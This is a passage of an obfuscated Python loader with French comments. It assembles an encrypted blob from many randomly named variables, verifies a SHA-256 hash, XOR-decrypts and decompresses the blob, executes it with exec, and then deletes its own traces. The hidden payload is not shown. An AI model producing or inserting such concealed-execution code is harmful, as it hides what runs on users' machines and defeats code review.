_czZPsxrnDe1MZb + _cwg1StzLcslaDE + _ccWb__Xp3Q_Ziq + _c_T7gLv3HSyVNC + _chK3DwPM0km9RS + _cixeloDv680iAL + _co_wmWWDZLQ1vA + _cun9LBwP1dev2O + _ccXqqMgDlGo84X + _clh_XrvPsEWqnE + _csSAeOgrOkUtVi + _cdfgKhP1gZd4fX + _cfWtsN0PmoonPn + _cyonbc7nXk5dAm + _cqW8SqeOHngWkT + _ceh6TzsrvvbU2w + _ceMobQi5sBmFdm + _ckGORG7xrUUozj + _ccIuIwJVjQ630k + _cqxmK1qp15sZbr + _cwjYkYSM8nSeJm + _cyykW9h2ORKKOh + _cwzaLKnp0cONyJ + _cb8T308g1MT8bs + _cbesm3xfvfpLNJ + _cq8R6EmAxM9M6Z + _crMNiw9kebTQfY + _cvXsX7sYSYRgok + _clAoEUo0IYyyCg + _coaKhveoGTI_hH + _cjgmdvaLOk0vEq + _coHbmgRSG0ouB3 + _cw9J78zf1nrgEX + _ckBG4aT9ibVNp_ + _cinMCvOTGMc6XK + _csxZbR8CbuHijh + _cv4ba9eijZf__Z + _ccDhNyAoOMeVrw + _crWXA1aR7r9IT0 + _cqEOYyxdhpUBFU + _cmQCqjH93XQqix + _cwIpGjJ6KQHoIf + _cn8sMo76By1hFX + _ci1IhO_BqQ0u53 + _cc6ztODifCHtSn + _cmNfTXOn1PSo_e + _cdU3ZjI4sREYKw + _cltNJcdrQeqkcR + _cnINDDYn05oM02 + _cbdT7Nu9zCavOX + _c_ezstLUVNXhLM + _cewYs1bv1ig3Gl + _cda7B33HF5mIOG + _clnIj_1Fwmj5qF + _cpzDcXnBN3nI1h + _crskED_qY6ptpB + _cojDtIbEK3u_jI + _czhVNWVm3pGxeC + _cst8y2NAWOUfdB + _ctJ82KcOZVfrE5 + _coiGvpNYzDm_pX + _corGPH7XuCslWQ)
if __import__('hashlib').sha256(_ppcXrDXAi9IRwb).hexdigest() != '994294a76cacdaf341ec02b7c6e4374fe5317c4ff4348a0a0f09c90b4c115ec4':
    __import__('sys').exit(1)
_xf3dtRTJr1Dfk7 = bytes([63, 66, 99, 128, 94, 9, 91, 121, 185, 100, 201, 255, 38, 235, 107, 147, 142, 192, 145, 48, 68, 196, 93, 214])
_fklz5TOcz_vl_L0 = bytes([111, 18, 171, 234, 150, 197, 237, 241, 150, 36, 173, 180, 31, 151, 28, 98, 195, 73, 74, 33, 196, 122, 83, 145])

def _fxcK2AYnR9oOQuQ(_b_r5xJmGKbR6j6, _krHAtn7bZ3sdcT):
    return bytes(_b_r5xJmGKbR6j6[_ieDIRzvKBuIbp6] ^ _krHAtn7bZ3sdcT[_ieDIRzvKBuIbp6 % len(_krHAtn7bZ3sdcT)] for _ieDIRzvKBuIbp6 in range(len(_b_r5xJmGKbR6j6)))

def _fdbBtSYSMHi75G1(_tyUtecTN3HfMqP):
    import zlib
    return zlib.decompress(_tyUtecTN3HfMqP) # Un seul niveau de zlib ici pour simplifier

def _fepTLH2ViwEQc0H():
    import sys, builtins
    # 1. Déchiffrement XOR
    _x__BIa7dBj8vst = _fxcK2AYnR9oOQuQ(_ppcXrDXAi9IRwb, _xf3dtRTJr1Dfk7)
    # 2. Décompression Zlib
    _doj3SbeztIO750 = _fdbBtSYSMHi75G1(_x__BIa7dBj8vst)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _doj3SbeztIO750.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _no8f2Ud8r0E_dB = _main.__dict__
    _no8f2Ud8r0E_dB.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _no8f2Ud8r0E_dB)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fepTLH2ViwEQc0H()
try:
    del _fxcK2AYnR9oOQuQ, _fdbBtSYSMHi75G1, _fepTLH2ViwEQc0H
    del _ppcXrDXAi9IRwb, _xf3dtRTJr1Dfk7, _fklz5TOcz_vl_L0
except:
    pass
